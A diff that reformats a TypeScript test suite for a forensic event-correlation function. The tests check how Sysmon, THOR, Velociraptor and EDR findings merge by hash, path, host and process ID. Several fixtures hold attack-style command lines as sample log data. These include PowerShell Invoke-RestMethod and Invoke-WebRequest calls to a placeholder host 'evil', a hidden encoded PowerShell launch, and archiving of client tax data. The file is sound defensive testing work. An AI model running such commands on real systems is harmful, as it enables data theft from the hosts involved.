@@ -4,22 +4,40 @@ import type { ForensicEvent } from "../../src/analysis/stateTypes.js";
 
 function ev(over: Partial<ForensicEvent> & { id: string }): ForensicEvent {
   return {
-    timestamp: "2026-05-26T12:00:00Z", description: "event", severity: "High",
-    mitreTechniques: [], relatedFindingIds: [], sourceScreenshots: [], ...over,
+    timestamp: "2026-05-26T12:00:00Z",
+    description: "event",
+    severity: "High",
+    mitreTechniques: [],
+    relatedFindingIds: [],
+    sourceScreenshots: [],
+    ...over,
   };
 }
 
 describe("correlateEvents", () => {
   it("merges a Velociraptor event and a THOR event about the same file (shared hash)", () => {
     const HASH = "4813e753f6f9bfa5c5de0edbb8dd3cc7f1fa51714097d3144d44e5e89dbd33ef";
-    const velo = ev({ id: "m1e1", description: `Downloaded file evil.exe flagged, sha256 ${HASH}`,
-      severity: "High", sources: ["CSV import"], sourceScreenshots: ["0001_velo.csv"], timestamp: "2026-05-26T08:35:23Z" });
-    const thor = ev({ id: "t2e5", description: "THOR Alert [Filescan]: Malware file found — C:\\Tools\\evil.exe",
-      severity: "Critical", sha256: HASH, sources: ["THOR"], sourceScreenshots: ["0002_thor.json"], timestamp: "2026-05-26T08:35:23Z" });
+    const velo = ev({
+      id: "m1e1",
+      description: `Downloaded file evil.exe flagged, sha256 ${HASH}`,
+      severity: "High",
+      sources: ["CSV import"],
+      sourceScreenshots: ["0001_velo.csv"],
+      timestamp: "2026-05-26T08:35:23Z",
+    });
+    const thor = ev({
+      id: "t2e5",
+      description: "THOR Alert [Filescan]: Malware file found — C:\\Tools\\evil.exe",
+      severity: "Critical",
+      sha256: HASH,
+      sources: ["THOR"],
+      sourceScreenshots: ["0002_thor.json"],
+      timestamp: "2026-05-26T08:35:23Z",
+    });
 
     const out = correlateEvents([velo, thor]);
-    expect(out).toHaveLength(1);                       // one canonical event
-    expect(out[0].severity).toBe("Critical");          // most severe wins
+    expect(out).toHaveLength(1); // one canonical event
+    expect(out[0].severity).toBe("Critical"); // most severe wins
     expect(out[0].sources).toEqual(expect.arrayContaining(["CSV import", "THOR"]));
     expect(out[0].sourceScreenshots).toEqual(expect.arrayContaining(["0001_velo.csv", "0002_thor.json"]));
     // Corroboration is conveyed via the sources field, NOT by mutating the description.
@@ -31,13 +49,24 @@ describe("correlateEvents", () => {
     // benign cmdlet, `Compress-Archive` (collection) and `Invoke-RestMethod` (exfil) into one row.
     // Process-creation events (those carrying a pid) correlate by host+pid, not image hash.
     const PSHASH = "5d9d62a6794ccf2b4ed30874273f8666fd353e183b7587ac4c8261edabe6990b";
-    const mk = (id: string, pid: number, cmd: string, t: string): ForensicEvent => ev({
-      id, description: `Sysmon Process create (EID 1) - powershell.exe - CommandLine=${cmd}`,
-      sha256: PSHASH, pid, asset: "FS-01.meridiancpa.com", timestamp: t, sources: ["Sysmon"],
-    });
+    const mk = (id: string, pid: number, cmd: string, t: string): ForensicEvent =>
+      ev({
+        id,
+        description: `Sysmon Process create (EID 1) - powershell.exe - CommandLine=${cmd}`,
+        sha256: PSHASH,
+        pid,
+        asset: "FS-01.meridiancpa.com",
+        timestamp: t,
+        sources: ["Sysmon"],
+      });
     const out = correlateEvents([
       mk("e1", 1000, "powershell.exe Get-Date", "2024-03-12T15:00:00Z"),
-      mk("e2", 9908, "powershell.exe -nop -c Compress-Archive -Path D:\\ClientData\\Tax2023", "2024-03-12T16:15:02Z"),
+      mk(
+        "e2",
+        9908,
+        "powershell.exe -nop -c Compress-Archive -Path D:\\ClientData\\Tax2023",
+        "2024-03-12T16:15:02Z",
+      ),
       mk("e3", 10436, "powershell.exe -nop -w hidden -c Invoke-RestMethod ...", "2024-03-12T17:00:21Z"),
     ]);
     expect(out).toHaveLength(3); // all three survive — distinct activities, not one binary
@@ -47,32 +76,73 @@ describe("correlateEvents", () => {
 
   it("never invents 'unknown source' for a source-less event, and self-heals a legacy note", () => {
     // An event from a build before `sources` existed (no sources) merged with a THOR event.
-    const legacy = ev({ id: "old", description: "Malware file found — evil.exe [corroborated by 2 sources: unknown source, THOR]",
-      sha256: "c".repeat(64), timestamp: "2025-01-01T00:00:00Z" }); // no sources field
-    const thor = ev({ id: "new", description: "Malware file found — evil.exe",
-      sha256: "c".repeat(64), timestamp: "2025-01-01T00:00:00Z", sources: ["THOR"] });
+    const legacy = ev({
+      id: "old",
+      description: "Malware file found — evil.exe [corroborated by 2 sources: unknown source, THOR]",
+      sha256: "c".repeat(64),
+      timestamp: "2025-01-01T00:00:00Z",
+    }); // no sources field
+    const thor = ev({
+      id: "new",
+      description: "Malware file found — evil.exe",
+      sha256: "c".repeat(64),
+      timestamp: "2025-01-01T00:00:00Z",
+      sources: ["THOR"],
+    });
     const out = correlateEvents([legacy, thor]);
     expect(out).toHaveLength(1);
-    expect(out[0].sources).toEqual(["THOR"]);              // only the real source, no "unknown source"
+    expect(out[0].sources).toEqual(["THOR"]); // only the real source, no "unknown source"
     expect(out[0].description).not.toContain("corroborated"); // legacy note stripped
   });
 
   it("merges same path within the time window, keeps distinct paths separate", () => {
-    const a = ev({ id: "a", description: "m.exe by THOR", path: "c:\\users\\srv\\m.exe", timestamp: "2026-05-26T12:00:00Z", sources: ["THOR"] });
-    const b = ev({ id: "b", description: "m.exe by Velo", path: "c:\\users\\srv\\m.exe", timestamp: "2026-05-26T12:00:01Z", sources: ["CSV import"] });
-    const c = ev({ id: "c", description: "other.exe", path: "c:\\users\\srv\\other.exe", timestamp: "2026-05-26T12:00:00Z", sources: ["THOR"] });
+    const a = ev({
+      id: "a",
+      description: "m.exe by THOR",
+      path: "c:\\users\\srv\\m.exe",
+      timestamp: "2026-05-26T12:00:00Z",
+      sources: ["THOR"],
+    });
+    const b = ev({
+      id: "b",
+      description: "m.exe by Velo",
+      path: "c:\\users\\srv\\m.exe",
+      timestamp: "2026-05-26T12:00:01Z",
+      sources: ["CSV import"],
+    });
+    const c = ev({
+      id: "c",
+      description: "other.exe",
+      path: "c:\\users\\srv\\other.exe",
+      timestamp: "2026-05-26T12:00:00Z",
+      sources: ["THOR"],
+    });
     const out = correlateEvents([a, b, c], { windowSeconds: 2 });
-    expect(out).toHaveLength(2);                        // a+b merge, c separate
+    expect(out).toHaveLength(2); // a+b merge, c separate
     const merged = out.find((e) => e.sources && e.sources.length === 2)!;
     expect(merged.sources).toEqual(expect.arrayContaining(["THOR", "CSV import"]));
   });
 
   it("merges a process creation seen by the EDR (ECAR) and the Windows log on host+pid", () => {
     // Same process creation, two tools, different wording + no shared hash/path — only the pid links them.
-    const ecar = ev({ id: "ec", description: "Process created: powershell.exe -enc … (parent explorer.exe) @ FILE-BO-01",
-      asset: "FILE-BO-01", pid: 5292, processName: "powershell.exe", sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:29:39.632Z" });
-    const evtx = ev({ id: "wn", description: "Microsoft-Windows-Sysmon Process Create (EID 1) - FILE-BO-01\\nina.kapoor @ FILE-BO-01",
-      asset: "FILE-BO-01", pid: 5292, processName: "powershell.exe", sources: ["Windows Event Log"], timestamp: "2024-05-14T13:29:40.001Z" });
+    const ecar = ev({
+      id: "ec",
+      description: "Process created: powershell.exe -enc … (parent explorer.exe) @ FILE-BO-01",
+      asset: "FILE-BO-01",
+      pid: 5292,
+      processName: "powershell.exe",
+      sources: ["EDR (ECAR)"],
+      timestamp: "2024-05-14T13:29:39.632Z",
+    });
+    const evtx = ev({
+      id: "wn",
+      description: "Microsoft-Windows-Sysmon Process Create (EID 1) - FILE-BO-01\\nina.kapoor @ FILE-BO-01",
+      asset: "FILE-BO-01",
+      pid: 5292,
+      processName: "powershell.exe",
+      sources: ["Windows Event Log"],
+      timestamp: "2024-05-14T13:29:40.001Z",
+    });
     const out = correlateEvents([ecar, evtx]);
     expect(out).toHaveLength(1);
     expect(out[0].sources).toEqual(expect.arrayContaining(["EDR (ECAR)", "Windows Event Log"]));
@@ -80,46 +150,105 @@ describe("correlateEvents", () => {
   });
 
   it("does NOT merge same pid on DIFFERENT hosts, or the same pid reused outside the window", () => {
-    const a = ev({ id: "a", description: "create @ A", asset: "HOST-A", pid: 4321, sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:00:00Z" });
-    const b = ev({ id: "b", description: "create @ B", asset: "HOST-B", pid: 4321, sources: ["Windows Event Log"], timestamp: "2024-05-14T13:00:01Z" });
+    const a = ev({
+      id: "a",
+      description: "create @ A",
+      asset: "HOST-A",
+      pid: 4321,
+      sources: ["EDR (ECAR)"],
+      timestamp: "2024-05-14T13:00:00Z",
+    });
+    const b = ev({
+      id: "b",
+      description: "create @ B",
+      asset: "HOST-B",
+      pid: 4321,
+      sources: ["Windows Event Log"],
+      timestamp: "2024-05-14T13:00:01Z",
+    });
     // Same host + pid but 10 minutes apart (pid recycled) — beyond the 120s window.
-    const c = ev({ id: "c", description: "later reuse @ A", asset: "HOST-A", pid: 4321, sources: ["Windows Event Log"], timestamp: "2024-05-14T13:10:00Z" });
+    const c = ev({
+      id: "c",
+      description: "later reuse @ A",
+      asset: "HOST-A",
+      pid: 4321,
+      sources: ["Windows Event Log"],
+      timestamp: "2024-05-14T13:10:00Z",
+    });
     expect(correlateEvents([a, b, c])).toHaveLength(3);
   });
 
   it("merges a process creation seen by two tools on the same command line + parent (different pids) (#68)", () => {
     // Sysmon and the EDR both record the same powershell creation, but each assigns its OWN pid and
     // neither shares a file hash — steps 0–3 all miss it. The normalized command line + parent link them.
-    const sysmon = ev({ id: "sm", description: "Sysmon Process create (EID 1) - powershell.exe - CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgA",
-      asset: "FILE-BO-01.corp.local", pid: 5292, processName: "powershell.exe", parentName: "explorer.exe",
-      sources: ["Sysmon"], timestamp: "2024-05-14T13:29:39.6Z" });
-    const edr = ev({ id: "ec", description: "Process created powershell.exe (encoded) under explorer.exe",
-      commandLine: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc SQBFAFgA',
-      asset: "FILE-BO-01", pid: 8123, processName: "powershell.exe", parentName: "explorer.exe",
-      sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:29:40.2Z" });
+    const sysmon = ev({
+      id: "sm",
+      description:
+        "Sysmon Process create (EID 1) - powershell.exe - CommandLine=powershell.exe -nop -w hidden -enc SQBFAFgA",
+      asset: "FILE-BO-01.corp.local",
+      pid: 5292,
+      processName: "powershell.exe",
+      parentName: "explorer.exe",
+      sources: ["Sysmon"],
+      timestamp: "2024-05-14T13:29:39.6Z",
+    });
+    const edr = ev({
+      id: "ec",
+      description: "Process created powershell.exe (encoded) under explorer.exe",
+      commandLine:
+        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -enc SQBFAFgA",
+      asset: "FILE-BO-01",
+      pid: 8123,
+      processName: "powershell.exe",
+      parentName: "explorer.exe",
+      sources: ["EDR (ECAR)"],
+      timestamp: "2024-05-14T13:29:40.2Z",
+    });
     const out = correlateEvents([sysmon, edr]);
     expect(out).toHaveLength(1);
     expect(out[0].sources).toEqual(expect.arrayContaining(["Sysmon", "EDR (ECAR)"]));
   });
 
   it("does NOT merge distinct commands from ONE tool that share a parent, nor the same command outside the window (#68)", () => {
-    const mk = (id: string, cmd: string, t: string): ForensicEvent => ev({
-      id, description: `Sysmon Process create (EID 1) - CommandLine=${cmd}`, asset: "H1",
-      pid: Math.floor(Math.random() * 1e6), processName: "powershell.exe", parentName: "explorer.exe",
-      sources: ["Sysmon"], timestamp: t,
-    });
+    const mk = (id: string, cmd: string, t: string): ForensicEvent =>
+      ev({
+        id,
+        description: `Sysmon Process create (EID 1) - CommandLine=${cmd}`,
+        asset: "H1",
+        pid: Math.floor(Math.random() * 1e6),
+        processName: "powershell.exe",
+        parentName: "explorer.exe",
+        sources: ["Sysmon"],
+        timestamp: t,
+      });
     // Two distinct commands from the same tool → never merge (corroboration guard).
     const a = mk("a", "powershell.exe -c Compress-Archive -Path D:\\Data", "2024-05-14T13:00:00Z");
     const b = mk("b", "powershell.exe -c Invoke-RestMethod http://evil/x", "2024-05-14T13:00:01Z");
     // Same command as `a` but from a DIFFERENT tool, 10 minutes later → beyond the 60s window.
-    const c = ev({ id: "c", description: "EDR: Process created", commandLine: "powershell.exe -c Compress-Archive -Path D:\\Data",
-      asset: "H1", pid: 9, processName: "powershell.exe", parentName: "explorer.exe", sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:10:01Z" });
+    const c = ev({
+      id: "c",
+      description: "EDR: Process created",
+      commandLine: "powershell.exe -c Compress-Archive -Path D:\\Data",
+      asset: "H1",
+      pid: 9,
+      processName: "powershell.exe",
+      parentName: "explorer.exe",
+      sources: ["EDR (ECAR)"],
+      timestamp: "2024-05-14T13:10:01Z",
+    });
     expect(correlateEvents([a, b, c])).toHaveLength(3);
   });
 
   it("populates chainSignature on a process-creation event (#68)", () => {
-    const e = ev({ id: "p", description: "Sysmon Process create (EID 1) - CommandLine=cmd.exe /c whoami",
-      asset: "H", pid: 100, processName: "cmd.exe", parentName: "explorer.exe", sources: ["Sysmon"] });
+    const e = ev({
+      id: "p",
+      description: "Sysmon Process create (EID 1) - CommandLine=cmd.exe /c whoami",
+      asset: "H",
+      pid: 100,
+      processName: "cmd.exe",
+      parentName: "explorer.exe",
+      sources: ["Sysmon"],
+    });
     const [out] = correlateEvents([e]);
     expect(out.chainSignature).toBeTruthy();
   });
@@ -128,14 +257,34 @@ describe("correlateEvents", () => {
     // Two different Defender detections seconds apart, each message carrying the same Microsoft
     // fwlink URL. The URL must not be read as a filesystem path and collapse them into one.
     const url = "https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32";
-    const a = ev({ id: "a", description: `Antivirus Hacktool Detection — ${url}/Passview&threatid=1`, timestamp: "2026-06-03T08:15:40.382Z" });
-    const b = ev({ id: "b", description: `Antivirus Hacktool Detection — ${url}/Mimikatz&threatid=2`, timestamp: "2026-06-03T08:15:40.417Z" });
+    const a = ev({
+      id: "a",
+      description: `Antivirus Hacktool Detection — ${url}/Passview&threatid=1`,
+      timestamp: "2026-06-03T08:15:40.382Z",
+    });
+    const b = ev({
+      id: "b",
+      description: `Antivirus Hacktool Detection — ${url}/Mimikatz&threatid=2`,
+      timestamp: "2026-06-03T08:15:40.417Z",
+    });
     expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
   });
 
   it("correlates a description path against a STRUCTURED path (AI event ↔ import)", () => {
-    const ai = ev({ id: "a", description: "wrote payload to /usr/local/bin/x", path: undefined, timestamp: "2026-06-03T08:00:00Z", sources: ["screenshot"] });
-    const imp = ev({ id: "b", description: "THOR finding", path: "/usr/local/bin/x", timestamp: "2026-06-03T08:00:01Z", sources: ["THOR"] });
+    const ai = ev({
+      id: "a",
+      description: "wrote payload to /usr/local/bin/x",
+      path: undefined,
+      timestamp: "2026-06-03T08:00:00Z",
+      sources: ["screenshot"],
+    });
+    const imp = ev({
+      id: "b",
+      description: "THOR finding",
+      path: "/usr/local/bin/x",
+      timestamp: "2026-06-03T08:00:01Z",
+      sources: ["THOR"],
+    });
     expect(correlateEvents([ai, imp], { windowSeconds: 2 })).toHaveLength(1);
   });
 
@@ -143,8 +292,20 @@ describe("correlateEvents", () => {
     // Distinct Sysmon Proc-Access detections seconds apart that merely share SrcProc powershell.exe
     // in their text must stay separate — neither carries a structured path.
     const exe = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
-    const a = ev({ id: "a", description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 5136`, path: undefined, timestamp: "2026-06-03T08:41:40.537Z", sources: ["Velociraptor"] });
-    const b = ev({ id: "b", description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 2097151`, path: undefined, timestamp: "2026-06-03T08:41:40.549Z", sources: ["Velociraptor"] });
+    const a = ev({
+      id: "a",
+      description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 5136`,
+      path: undefined,
+      timestamp: "2026-06-03T08:41:40.537Z",
+      sources: ["Velociraptor"],
+    });
+    const b = ev({
+      id: "b",
+      description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 2097151`,
+      path: undefined,
+      timestamp: "2026-06-03T08:41:40.549Z",
+      sources: ["Velociraptor"],
+    });
     expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
   });
 
@@ -152,9 +313,27 @@ describe("correlateEvents", () => {
     // Every PSReadline command shares the history-file OSPath (a structured path) and is undated —
     // but they're distinct commands from one tool, not the same artifact seen twice.
     const hist = "c:\\users\\v\\appdata\\...\\consolehost_history.txt";
-    const a = ev({ id: "a", description: "whoami /all", path: hist, timestamp: "", sources: ["Velociraptor"] });
-    const b = ev({ id: "b", description: "Invoke-WebRequest http://evil/x", path: hist, timestamp: "", sources: ["Velociraptor"] });
-    const c = ev({ id: "c", description: "net user administrator", path: hist, timestamp: "", sources: ["Velociraptor"] });
+    const a = ev({
+      id: "a",
+      description: "whoami /all",
+      path: hist,
+      timestamp: "",
+      sources: ["Velociraptor"],
+    });
+    const b = ev({
+      id: "b",
+      description: "Invoke-WebRequest http://evil/x",
+      path: hist,
+      timestamp: "",
+      sources: ["Velociraptor"],
+    });
+    const c = ev({
+      id: "c",
+      description: "net user administrator",
+      path: hist,
+      timestamp: "",
+      sources: ["Velociraptor"],
+    });
     expect(correlateEvents([a, b, c])).toHaveLength(3);
   });
 
@@ -173,7 +352,10 @@ describe("correlateEvents", () => {
 
   it("is idempotent — correlating an already-merged result changes nothing", () => {
     const HASH = "b".repeat(64);
-    const once = correlateEvents([ev({ id: "a", sha256: HASH, sources: ["THOR"] }), ev({ id: "b", sha256: HASH, sources: ["CSV"] })]);
+    const once = correlateEvents([
+      ev({ id: "a", sha256: HASH, sources: ["THOR"] }),
+      ev({ id: "b", sha256: HASH, sources: ["CSV"] }),
+    ]);
     const twice = correlateEvents(once);
     expect(twice).toHaveLength(1);
     expect(twice[0].id).toBe(once[0].id);
@@ -182,11 +364,20 @@ describe("correlateEvents", () => {
   it("collapses exact duplicates (same time + description) — the re-imported-file case", () => {
     // Same THOR finding imported 3 times → 3 events with identical time+description but no
     // shared id (different import prefixes). Must collapse to one.
-    const dup = (id: string, src: string) => ev({
-      id, description: "THOR Notice [Filescan]: Suspicious file found — C:\\Tools\\NirSoft\\lsasecretsdump.exe",
-      timestamp: "2009-11-29T10:25:34Z", severity: "Medium", sources: ["THOR"], sourceScreenshots: [src],
-    });
-    const out = correlateEvents([dup("t4e1", "0004.json"), dup("t5e1", "0005.json"), dup("t6e1", "0006.json")]);
+    const dup = (id: string, src: string) =>
+      ev({
+        id,
+        description: "THOR Notice [Filescan]: Suspicious file found — C:\\Tools\\NirSoft\\lsasecretsdump.exe",
+        timestamp: "2009-11-29T10:25:34Z",
+        severity: "Medium",
+        sources: ["THOR"],
+        sourceScreenshots: [src],
+      });
+    const out = correlateEvents([
+      dup("t4e1", "0004.json"),
+      dup("t5e1", "0005.json"),
+      dup("t6e1", "0006.json"),
+    ]);
     expect(out).toHaveLength(1);
     expect(out[0].sourceScreenshots).toEqual(expect.arrayContaining(["0004.json", "0005.json", "0006.json"]));
     expect(out[0].sources).toEqual(["THOR"]); // same source, not falsely "3 sources"
@@ -214,10 +405,21 @@ describe("correlateEvents", () => {
     // because artifactName fell back to whichever contributing event happened to carry one. Merge is
     // forced by a shared sha256.
     const HASH = "a".repeat(64);
-    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
-      severity: "High", sha256: HASH, sources: ["Velociraptor"] }); // longer + more severe → primary, NO artifactName
-    const b = ev({ id: "e2", description: "MFT: created evil.exe",
-      severity: "Info", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.NTFS.MFT" });
+    const a = ev({
+      id: "e1",
+      description: "Sigma detection: suspicious file creation flagged on the host",
+      severity: "High",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+    }); // longer + more severe → primary, NO artifactName
+    const b = ev({
+      id: "e2",
+      description: "MFT: created evil.exe",
+      severity: "Info",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+      artifactName: "Windows.NTFS.MFT",
+    });
     const [merged] = correlateEvents([a, b]);
     expect(merged.description).toContain("Sigma detection");
     expect(merged.artifactName).toBeUndefined();
@@ -225,10 +427,22 @@ describe("correlateEvents", () => {
 
   it("keeps artifactName when primary itself carries one (no cross-event borrowing needed)", () => {
     const HASH = "c".repeat(64);
-    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
-      severity: "High", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.EventLogs.Chainsaw" });
-    const b = ev({ id: "e2", description: "MFT: created evil.exe",
-      severity: "Info", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.NTFS.MFT" });
+    const a = ev({
+      id: "e1",
+      description: "Sigma detection: suspicious file creation flagged on the host",
+      severity: "High",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+      artifactName: "Windows.EventLogs.Chainsaw",
+    });
+    const b = ev({
+      id: "e2",
+      description: "MFT: created evil.exe",
+      severity: "Info",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+      artifactName: "Windows.NTFS.MFT",
+    });
     const [merged] = correlateEvents([a, b]);
     expect(merged.artifactName).toBe("Windows.EventLogs.Chainsaw");
   });
@@ -237,11 +451,22 @@ describe("correlateEvents", () => {
     // Same fallback pattern as artifactName: put message/veloUrl on the NON-primary (Info) event so the
     // `...primary` spread alone would drop them — the `events.find(...)` fallback must carry them through.
     const HASH = "b".repeat(64);
-    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
-      severity: "High", sha256: HASH, sources: ["Velociraptor"] }); // longer + more severe → primary
-    const b = ev({ id: "e2", description: "MFT: created evil.exe", severity: "Info", sha256: HASH,
-      sources: ["Velociraptor"], message: "FULL rendered event message ".repeat(20),
-      veloUrl: "https://velo.example/app/index.html?org_id=root#/hunts/H.ABC" });
+    const a = ev({
+      id: "e1",
+      description: "Sigma detection: suspicious file creation flagged on the host",
+      severity: "High",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+    }); // longer + more severe → primary
+    const b = ev({
+      id: "e2",
+      description: "MFT: created evil.exe",
+      severity: "Info",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+      message: "FULL rendered event message ".repeat(20),
+      veloUrl: "https://velo.example/app/index.html?org_id=root#/hunts/H.ABC",
+    });
     const [merged] = correlateEvents([a, b]);
     expect(merged.message).toContain("FULL rendered event message");
     expect(merged.veloUrl).toBe("https://velo.example/app/index.html?org_id=root#/hunts/H.ABC");
@@ -249,7 +474,12 @@ describe("correlateEvents", () => {
 
   it("preserves process-chain fields from any event in a merged group", () => {
     const HASH = "d".repeat(64);
-    const primary = ev({ id: "a", description: "longer Velociraptor detection text", sha256: HASH, sources: ["Velociraptor"] });
+    const primary = ev({
+      id: "a",
+      description: "longer Velociraptor detection text",
+      sha256: HASH,
+      sources: ["Velociraptor"],
+    });
     const withChain = ev({
       id: "b",
       description: "THOR process chain",
@@ -257,7 +487,11 @@ describe("correlateEvents", () => {
       sources: ["THOR"],
       processName: "powershell.exe",
       parentName: "winword.exe",
-      chainCheck: { observed: false, note: "winword.exe -> powershell.exe is unusual", checkedAt: "2026-05-26T12:01:00Z" },
+      chainCheck: {
+        observed: false,
+        note: "winword.exe -> powershell.exe is unusual",
+        checkedAt: "2026-05-26T12:01:00Z",
+      },
     });
 
     const out = correlateEvents([primary, withChain]);
@@ -277,8 +511,22 @@ describe("artifact correlation is scoped to a host (#345)", () => {
 
   it("keeps the same binary on two hosts as two events", () => {
     const out = correlateEvents([
-      ev({ id: "a", description: "beacon.exe dropped", asset: "WS-01", sha256: SHA, sources: ["Velociraptor"], timestamp: "2026-05-20T14:00:00Z" }),
-      ev({ id: "b", description: "beacon.exe dropped", asset: "SRV-02", sha256: SHA, sources: ["THOR"], timestamp: "2026-05-20T14:40:00Z" }),
+      ev({
+        id: "a",
+        description: "beacon.exe dropped",
+        asset: "WS-01",
+        sha256: SHA,
+        sources: ["Velociraptor"],
+        timestamp: "2026-05-20T14:00:00Z",
+      }),
+      ev({
+        id: "b",
+        description: "beacon.exe dropped",
+        asset: "SRV-02",
+        sha256: SHA,
+        sources: ["THOR"],
+        timestamp: "2026-05-20T14:40:00Z",
+      }),
     ]);
     expect(out).toHaveLength(2);
     expect(out.map((e) => e.asset).sort()).toEqual(["SRV-02", "WS-01"]);
@@ -289,8 +537,22 @@ describe("artifact correlation is scoped to a host (#345)", () => {
 
   it("still merges two tools reporting that binary on the SAME host", () => {
     const out = correlateEvents([
-      ev({ id: "a", description: "beacon.exe dropped", asset: "WS-01", sha256: SHA, sources: ["Velociraptor"], timestamp: "2026-05-20T14:00:00Z" }),
-      ev({ id: "b", description: "Malware file found — beacon.exe", asset: "WS-01", sha256: SHA, sources: ["THOR"], timestamp: "2026-05-20T14:00:01Z" }),
+      ev({
+        id: "a",
+        description: "beacon.exe dropped",
+        asset: "WS-01",
+        sha256: SHA,
+        sources: ["Velociraptor"],
+        timestamp: "2026-05-20T14:00:00Z",
+      }),
+      ev({
+        id: "b",
+        description: "Malware file found — beacon.exe",
+        asset: "WS-01",
+        sha256: SHA,
+        sources: ["THOR"],
+        timestamp: "2026-05-20T14:00:01Z",
+      }),
     ]);
     expect(out).toHaveLength(1);
     expect(out[0].sources).toEqual(expect.arrayContaining(["Velociraptor", "THOR"]));
@@ -326,16 +588,44 @@ describe("artifact correlation is scoped to a host (#345)", () => {
 
   it("keeps the same path on two hosts as two events", () => {
     const out = correlateEvents([
-      ev({ id: "a", description: "file written", asset: "WS-01", path: "c:\\windows\\temp\\evil.exe", sources: ["Velociraptor"], timestamp: "2026-05-20T14:00:00Z" }),
-      ev({ id: "b", description: "file written", asset: "SRV-02", path: "c:\\windows\\temp\\evil.exe", sources: ["THOR"], timestamp: "2026-05-20T14:00:01Z" }),
+      ev({
+        id: "a",
+        description: "file written",
+        asset: "WS-01",
+        path: "c:\\windows\\temp\\evil.exe",
+        sources: ["Velociraptor"],
+        timestamp: "2026-05-20T14:00:00Z",
+      }),
+      ev({
+        id: "b",
+        description: "file written",
+        asset: "SRV-02",
+        path: "c:\\windows\\temp\\evil.exe",
+        sources: ["THOR"],
+        timestamp: "2026-05-20T14:00:01Z",
+      }),
     ]);
     expect(out).toHaveLength(2);
   });
 
   it("still merges the same path reported by two tools on one host", () => {
     const out = correlateEvents([
-      ev({ id: "a", description: "file written", asset: "WS-01", path: "c:\\windows\\temp\\evil.exe", sources: ["Velociraptor"], timestamp: "2026-05-20T14:00:00Z" }),
-      ev({ id: "b", description: "file written", asset: "WS-01", path: "c:\\windows\\temp\\evil.exe", sources: ["THOR"], timestamp: "2026-05-20T14:00:01Z" }),
+      ev({
+        id: "a",
+        description: "file written",
+        asset: "WS-01",
+        path: "c:\\windows\\temp\\evil.exe",
+        sources: ["Velociraptor"],
+        timestamp: "2026-05-20T14:00:00Z",
+      }),
+      ev({
+        id: "b",
+        description: "file written",
+        asset: "WS-01",
+        path: "c:\\windows\\temp\\evil.exe",
+        sources: ["THOR"],
+        timestamp: "2026-05-20T14:00:01Z",
+      }),
     ]);
     expect(out).toHaveLength(1);
   });
